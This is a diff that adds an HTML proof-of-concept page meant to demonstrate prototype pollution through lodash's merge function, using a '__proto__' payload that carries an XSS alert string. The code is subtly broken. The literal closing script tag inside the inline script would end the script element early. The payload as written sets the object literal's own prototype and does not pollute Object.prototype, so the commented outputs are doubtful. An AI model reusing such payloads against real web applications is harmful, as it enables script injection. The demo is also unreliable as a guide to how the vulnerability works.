@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Prototype Pollution Demo</title>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js"></script>
+</head>
+<body>
+
+<script>
+// Define the payload to be injected into the object's prototype
+var payload = {
+  "__proto__": {
+    "xssPayload": "<script>alert('XSS!')</script>"
+  }
+};
+
+// Create a sample object
+var obj = {
+  name: "John"
+};
+
+// Merge the payload into the object using Lodash's merge function
+_.merge(obj, payload);
+
+// Print the object's properties to the console
+console.log(obj.name); // Output: "John"
+console.log(obj.xssPayload); // Output: "<script>alert('XSS!')</script>"
+</script>
+
+</body>
+</html>
